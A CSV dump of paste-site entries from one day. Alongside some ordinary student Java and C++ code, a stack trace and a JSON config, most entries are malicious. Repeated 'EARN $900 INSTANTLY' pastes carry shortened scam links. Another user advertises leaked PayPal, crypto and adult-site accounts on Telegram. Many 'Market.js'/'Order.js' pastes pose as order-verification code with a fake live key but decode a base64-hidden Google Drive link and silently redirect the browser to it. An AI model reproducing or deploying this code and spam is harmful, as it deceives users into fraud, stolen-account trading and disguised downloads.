id,title,username,language,date,content
1Q34mF0T,EARN $900 INSTANTLY 2025 M6,kadohasrona,JavaScript,Saturday 26th of April 2025 01:06:04 PM CDT," 
Pdf https://tinyurl.com/privguidee

LhAnDvUEEz
"
r1vBANVB,Crypto Accounts,rodrigomaise99,JavaScript,Saturday 26th of April 2025 01:05:29 PM CDT,98499 Accounts Posted On https://t.me/leakedbyem1nem
pcMtjxAN,Market.js,x2LeaF,JavaScript,Saturday 26th of April 2025 12:58:39 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/10362/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
7Waz6tbe,EARN $900 INSTANTLY 2025 M6,SoftechSource,JavaScript,Saturday 26th of April 2025 12:56:30 PM CDT," 
Pdf https://tinyurl.com/privguidee

olZgv4lJsU
"
9SbjuhqA,[NP] Services & Microservices,dzocesrce,Java,Saturday 26th of April 2025 12:52:13 PM CDT,"import java.util.Scanner;
import java.util.HashMap;
import java.util.Map;
import java.util.stream.Collectors;
import java.util.ArrayList;
import java.util.List;
import java.util.*;

class Microservice {
    String microserviceName;
    List<Log> logs;

    public Microservice(String microserviceName) {
        this.microserviceName = microserviceName;
        this.logs= new ArrayList<>();
    }

    public String getMicroserviceName() {
        return microserviceName;
    }


    public int getSerenity(){
        return logs.stream().mapToInt(i->i.getLogSerenity()).sum();
    }

    @Override
    public String toString() {
        StringBuilder stringBuilder= new StringBuilder();
        for(Log l : logs){
            stringBuilder.append(String.format(""%s %s"",microserviceName,l.toString()));
        }
        return stringBuilder.toString().trim();
    }
}

class Log {
    String type;
    String message;
    int timestamp;

    public Log(String type, String message, int timestamp) {

        this.type = type;
        this.message = message;
        this.timestamp = timestamp;
    }


    public String getType() {
        return type;
    }

    public String getMessage() {
        return message;
    }

    public int getLogSerenity(){
        int serenity=0;
        if(type.equals(""WARN"")){
            serenity++;
            if(message.contains(""might cause error""))
                serenity++;
        }
        else if(type.equals(""ERROR"")){
            serenity+=3;
            if(message.contains(""fatal""))
                serenity+=2;
            if(message.contains(""exception""))
                serenity+=3;
        }
        return serenity;
    }

    public int getTimestamp() {
        return timestamp;
    }

    @Override
    public String toString() {
        return String.format("" [%s]%s %d T:%d"",type,message,timestamp,timestamp);
    }
}


class LogCollector {
    Map<String,Service> services;
    public LogCollector() {
        services= new HashMap<>();
    }

    public void addLog(String log) {
        String[] parts= log.split(""\\s+"");
        String service = parts[0];
        String microservice = parts[1];
        String type = parts[2];
        String message="""";
        for(int i=3;i<parts.length-1;i++){
            message= message.concat("" ""+parts[i]);
        }
        int timestamp= Integer.parseInt(parts[parts.length-1]);
        services.putIfAbsent(service,new Service(service));
        services.get(service).microservices.putIfAbsent(microservice,new Microservice(microservice));
        services.get(service).microservices.get(microservice).logs.add(new Log(type,message,timestamp));

    }

    public void printServicesBySeverity() {
        services.values().stream().sorted().forEach(i-> System.out.println(i));
    }

    public Map<Integer, Long> getSeverityDistribution(String service, String microservice) {
        if(microservice==null)
            return services.get(service).microservices.values().stream().flatMap(list->list.logs.stream()).collect(Collectors.groupingBy(
                    Log::getLogSerenity,
                    Collectors.counting()
            ));

        return services.get(service).microservices.get(microservice).logs.stream().collect(Collectors.groupingBy(
                Log::getLogSerenity,
                Collectors.counting()
        ));
    }

    public void displayLogs(String service, String microservice, String order) {

        Comparator<Log> OLDEST_FIRST = Comparator.comparing(Log::getTimestamp);
        Comparator<Log> NEWEST_FIRST = OLDEST_FIRST.reversed();
        Comparator<Log> LEAST_SEVERE_FIRST = Comparator.comparing(Log::getLogSerenity);
        Comparator<Log> MOST_SEVERE_FIRST = LEAST_SEVERE_FIRST.reversed();
        Comparator<Log> comparator;
        if(order.equals(""OLDEST_FIRST""))
            comparator= OLDEST_FIRST;
        else if(order.equals(""NEWEST_FIRST""))
            comparator= NEWEST_FIRST;
        else if(order.equals(""LEAST_SEVERE_FIRST""))
            comparator= LEAST_SEVERE_FIRST;
        else
            comparator= MOST_SEVERE_FIRST;

        if(microservice==null){
            System.out.println(String.format(""displayLogs %s %s"",service,order));
            services.get(service).microservices.values()
                    .stream().flatMap(list->list.logs.stream()).sorted(comparator).forEach(i-> System.out.println(String.format(""%s%s"",service,i.toString())));
        }
        else{
            System.out.println(String.format(""displayLogs %s %s %s"",service,microservice,order));
            services.get(service).microservices.get(microservice)
                    .logs.stream().sorted(comparator).forEach(i-> System.out.println(String.format(""%s|%s%s"",service,microservice,i.toString())));
        }
        
    }
}

class Service implements Comparable<Service>{
    String serviceName;
    Map<String,Microservice> microservices;

    public int getSerenity(){
        return microservices.values().stream().mapToInt(i->i.getSerenity()).sum();
    }

    public double getAvgSerenity(){
        return getSerenity()/(double)getNumberOfLogs();
    }

    public int getNumberOfLogs(){
        return (int)microservices.values().stream().flatMap(list->list.logs.stream()).count();
    }

    public Service(String serviceName) {
        this.serviceName = serviceName;
        this.microservices = new HashMap<>();
    }

    @Override
    public String toString() {
        return String.format(""Service name: %s Count of microservices: %d "" +
                ""Total logs in service: %d Average severity for all logs: %.2f "" +
                ""Average number of logs per microservice: %.2f"",serviceName, microservices.size(),getNumberOfLogs()
                ,getAvgSerenity(),getNumberOfLogs()/(double)microservices.size());
    }

    @Override
    public int compareTo(Service o) {
        return Comparator.comparing(Service::getAvgSerenity).reversed().compare(this,o);
    }
}

public class LogsTester {
    public static void main(String[] args) {
        Scanner sc = new Scanner(System.in);
        LogCollector collector = new LogCollector();
        while (sc.hasNextLine()) {
            String line = sc.nextLine();
            if (line.startsWith(""addLog"")) {
                collector.addLog(line.replace(""addLog "", """"));
            } else if (line.startsWith(""printServicesBySeverity"")) {
                collector.printServicesBySeverity();
            } else if (line.startsWith(""getSeverityDistribution"")) {
                String[] parts = line.split(""\\s+"");
                String service = parts[1];
                String microservice = null;
                if (parts.length == 3) {
                    microservice = parts[2];
                }
                collector.getSeverityDistribution(service, microservice).forEach((k,v)-> System.out.printf(""%d -> %d%n"", k,v));
            } 
            
            else if (line.startsWith(""displayLogs"")){
                String[] parts = line.split(""\\s+"");
                String service = parts[1];
                String microservice = null;
                String order = null;
                if (parts.length == 4) {
                    microservice = parts[2];
                    order = parts[3];
                } else {
                    order = parts[2];
                }
                collector.displayLogs(service, microservice, order);
            }
            
        }
    }
}"
F7QG4PH4,PayPal with Balance,rodrigomaise99,JavaScript,Saturday 26th of April 2025 12:50:05 PM CDT,99511 Accounts Posted On https://t.me/leakedbyem1nem
u6Smyn8w,Make $1000 15-MINUTES (BEGINNER) 96,SoftechSource,JavaScript,Saturday 26th of April 2025 12:47:15 PM CDT," 
Pdf https://tinyurl.com/privguidee

NbkJ3DQgPt
"
Uec654Vv,Untitled,x2LeaF,JavaScript,Saturday 26th of April 2025 12:43:17 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/23528/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
HcKwdhAe,EARN $900 INSTANTLY 2025 M6,covertbelli,JavaScript,Saturday 26th of April 2025 12:37:19 PM CDT," 
Pdf https://tinyurl.com/privguidee

FrpYNbea1C
"
cJSmGmC6,Leaked Accounts - Fresh Hits,rodrigomaise99,JavaScript,Saturday 26th of April 2025 12:34:43 PM CDT,05451 Accounts Posted On https://t.me/leakedbyem1nem
4j0pEeyV,снм долгий,nq1s788,C++,Saturday 26th of April 2025 12:33:51 PM CDT,"#include <iostream>
#include <set>
#include <vector>
#include <deque>

#define se second
#define fi first
#define mp make_pair
#define pb push_back

using namespace std;

vector<int> p;

int get_root(int x) {
    if (p[x] == x) return x;
    return get_root(p[x]);
}

void unite(int x, int y) {
    x = get_root(x);
    y = get_root(y);
    p[x] = y;
}

bool check(int x, int y) {
    return get_root(x) == get_root(y);
}

int main() {
    int n, m;
    cin >> n >> m;
    p.resize(n);
    for (int i = 0; i < n; i++) p[i] = i;
    while (m--) {
        ///
    }
    return 0;
}
"
z7Ypg5Js,2025-04-26T20:30:55.524024,powerampache,PHP,Saturday 26th of April 2025 12:30:55 PM CDT,"1.01-80-free (80) - DB: 83
java.lang.NullPointerException: Parameter specified as non-null is null: method luci.sixsixsix.powerampache2.domain.models.User.<init>, parameter id
	at luci.sixsixsix.powerampache2.domain.models.User.<init>(Unknown Source:20)
	at luci.sixsixsix.powerampache2.data.remote.dto.UserDtoKt.toUser(UserDto.kt:94)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.getUserNetwork(BaseAmpacheRepository.kt:128)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$getUserNetwork$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:811)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:715)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:702)

"
asCuVPXc,Make $1000 15-MINUTES (BEGINNER) 96,covertbelli,JavaScript,Saturday 26th of April 2025 12:27:59 PM CDT," 
Pdf https://tinyurl.com/privguidee

rHgkOiIece
"
jFCrGXz3,Products.js,x2LeaF,JavaScript,Saturday 26th of April 2025 12:27:54 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/00482/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
VUppeDkq,Chaturbate with Tokens,rodrigomaise99,JavaScript,Saturday 26th of April 2025 12:19:22 PM CDT,73557 Accounts Posted On https://t.me/leakedbyem1nem
4jZTG2m8,EARN $900 INSTANTLY 2025⭐ NU,covertbelli,JavaScript,Saturday 26th of April 2025 12:18:41 PM CDT," 
Pdf https://tinyurl.com/privguidee

JnFP4qeNWG
"
BAY9sHb3,Order.js,x2LeaF,JavaScript,Saturday 26th of April 2025 12:12:24 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/64671/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xKvHhc7Q,Make $1000 15-MINUTES  (BEGINNER) ME,covertbelli,JavaScript,Saturday 26th of April 2025 12:09:23 PM CDT," 
Pdf https://tinyurl.com/privguidee

U6bOPxynK6
"
a5mFrtdp,игра камни через рекурсию,nq1s788,C++,Saturday 26th of April 2025 12:04:50 PM CDT,"///https://informatics.msk.ru/mod/statements/view.php?id=298&chapterid=366#1

#include <iostream>
#include <set>
#include <vector>
#include <deque>

#define se second
#define fi first
#define mp make_pair
#define pb push_back

using namespace std;

vector<int> F;

int f(int n) {
    if (n <= 0) return 2;
    if (F[n] != 0) return F[n];
    vector<int> next;
    if (n % 3 == 0) {
        next = {n - 1, n - 2};
    } else if (n % 3 == 1) {
        next = {n - 1, n - 3};
    } else {
        next = {n - 1, n - 2, n - 3};
    }
    for (auto e : next) {
        if (f(e) == 2) {
            F[n] = 1;
            return 1;
        }
    }
    F[n] = 2;
    return 2;
}

int main() {
    int n;
    cin >> n;
    F.assign(n + 1, 0);
    cout << f(n);
    return 0;
}
"
WZK3wJcV,Crypto Accounts,rodrigomaise99,JavaScript,Saturday 26th of April 2025 12:04:00 PM CDT,95775 Accounts Posted On https://t.me/leakedbyem1nem
Ung5xcGA,Market.js,x2LeaF,JavaScript,Saturday 26th of April 2025 11:56:56 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/04700/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
51qSWczc,PayPal with Balance,rodrigomaise99,JavaScript,Saturday 26th of April 2025 11:48:38 AM CDT,68705 Accounts Posted On https://t.me/leakedbyem1nem
NqrqeCL5,Untitled,x2LeaF,JavaScript,Saturday 26th of April 2025 11:41:35 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/35221/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FNvKE73E,Leaked Accounts - Fresh Hits,rodrigomaise99,JavaScript,Saturday 26th of April 2025 11:33:15 AM CDT,26114 Accounts Posted On https://t.me/leakedbyem1nem
d9GcX7Un,Products.js,x2LeaF,JavaScript,Saturday 26th of April 2025 11:26:12 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/80324/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
JDJ5bWiP,Chaturbate with Tokens,rodrigomaise99,JavaScript,Saturday 26th of April 2025 11:17:53 AM CDT,19275 Accounts Posted On https://t.me/leakedbyem1nem
3kHDbPJ2,Order.js,x2LeaF,JavaScript,Saturday 26th of April 2025 11:10:50 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/15915/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
99Gb0yJN,Crypto Accounts,rodrigomaise99,JavaScript,Saturday 26th of April 2025 11:02:31 AM CDT,10483 Accounts Posted On https://t.me/leakedbyem1nem
VNE7g16i,"[NP] Post, Comments & Likes",dzocesrce,Java,Saturday 26th of April 2025 10:59:44 AM CDT,"import java.util.*;
import java.util.stream.Collectors;
import java.util.stream.IntStream;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
class Comment implements Comparable<Comment> {

    String author;
    String id;
    String content;
    String replyToId;
    int likes;

    public int getLikes() {
        return likes;
    }

    public Comment(String author, String id, String content, String replyToId) {
        this.author = author;
        this.id = id;
        this.content = content;
        this.replyToId = replyToId;
        this.likes=0;
    }

    public Comment(String author, String id, String content) {
        this.author = author;
        this.id = id;
        this.content = content;
    }

    @Override
    public String toString() {
        StringBuilder  stringBuilder = new StringBuilder();
                stringBuilder.append(String.format(""        Comment: %s\n"" +
                ""        Written by: %s\n"" +
                ""        Likes: %d"",content,author,likes));
        return stringBuilder.toString();
    }

    @Override
    public int compareTo(Comment o) {
        return Comparator.comparing(Comment::getLikes).reversed().compare(this,o);
    }


    public void incrementLikes() {
        likes++;
    }
}

class Post {
    String postAuthor;
    String postContent;
    Map<String,Comment> comments;


    public Post(String postAuthor, String postContent) {
        this.comments = new HashMap<>();
        this.postAuthor = postAuthor;
        this.postContent = postContent;
    }

    public void addComment(String author, String id, String content, String replyToId) {
        if(replyToId==null)
            comments.putIfAbsent(id,new Comment(author,id,content));
        else{
            comments.putIfAbsent(id,new Comment(author,id,content,replyToId));
        }
    }

    public void likeComment(String id) {
        comments.get(id).incrementLikes();
    }


    @Override
    public String toString() {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append(String.format(""Post: %s\nWritten by: %s\nComments:\n"", postContent, postAuthor));

        comments.values().stream()
                .filter(c -> c.replyToId == null)
                .sorted() // ова е ново!!!
                .forEach(comment -> {
                    appendCommentWithReplies(comment, stringBuilder, 1);
                });

        return stringBuilder.toString().trim();
    }


    private void appendCommentWithReplies(Comment comment, StringBuilder sb, int indentLevel) {
        // Add indentation
        sb.append(""        "".repeat(indentLevel));
        sb.append(String.format(""Comment: %s\n"", comment.content));
        sb.append(""        "".repeat(indentLevel));
        sb.append(String.format(""Written by: %s\n"", comment.author));
        sb.append(""        "".repeat(indentLevel));
        sb.append(String.format(""Likes: %d\n"", comment.likes));

        // Find replies to this comment
        comments.values().stream()
                .filter(c -> comment.id.equals(c.replyToId))
                .sorted()
                .forEach(reply -> appendCommentWithReplies(reply, sb, indentLevel + 1));
    }
}

public class PostTester {
    public static void main(String[] args) {
        Scanner sc = new Scanner(System.in);
        String postAuthor = sc.nextLine();
        String postContent = sc.nextLine();

        Post p = new Post(postAuthor, postContent);

        while (sc.hasNextLine()) {
            String line = sc.nextLine();
            String[] parts = line.split("";"");
            String testCase = parts[0];

            if (testCase.equals(""addComment"")) {
                String author = parts[1];
                String id = parts[2];
                String content = parts[3];
                String replyToId = null;
                if (parts.length == 5) {
                    replyToId = parts[4];
                }
                p.addComment(author, id, content, replyToId);
            } else if (testCase.equals(""likes"")) { //likes;1;2;3;4;1;1;1;1;1 example
                for (int i = 1; i < parts.length; i++) {
                    p.likeComment(parts[i]);
                }
            } else {
                System.out.println(p);
            }

        }
    }
}"
GJvG8f5C,Market.js,x2LeaF,JavaScript,Saturday 26th of April 2025 10:55:27 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/10357/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Wxh6T3fK,PayPal with Balance,rodrigomaise99,JavaScript,Saturday 26th of April 2025 10:47:08 AM CDT,11179 Accounts Posted On https://t.me/leakedbyem1nem
sRX2uuTe,Untitled,x2LeaF,JavaScript,Saturday 26th of April 2025 10:40:05 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/20267/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
a6GaCnMJ,Products.js,x2LeaF,JavaScript,Saturday 26th of April 2025 10:24:42 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/72409/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
BHTJmcN2,Rrrrrr,Rakibmunshi721,JSON,Saturday 26th of April 2025 10:11:16 AM CDT,"{
  ""title"": ""⚡Ads Verification⚡"",
  ""message"": ""All text and titles can be replaced with json\nworking on the app right now\n🌟 Add Your text\n🌟 Add your text\n🌟 Add your text\n🌟 Add your text"",
  ""telegramLink"": ""t.me/your_channel"",
  ""whatsappLink"": ""wa.me/your_number"",
  ""youtubeLink"": ""youtube.com/your_channel"",
  ""showUpdate"": false,
  ""updateLink"": ""yourdomain.com/update.apk"",
  ""showVerify"": true,
  ""serverLinks"": {
    ""server1"": {
      ""startUrl"": ""https://www.deviceinfo.me/"",
      ""verifyUrl"": ""test""
    },
    ""server2"": {
      ""startUrl"": ""https://www.whatismybrowser.com/"",
      ""verifyUrl"": ""Ansari.com""
    },
    ""server3"": {
      ""startUrl"": ""https://browserleaks.com/"",
      ""verifyUrl"": ""test""
    }
  }
}"
Ld9v1DXm,Order.js,x2LeaF,JavaScript,Saturday 26th of April 2025 10:09:20 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/08689/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
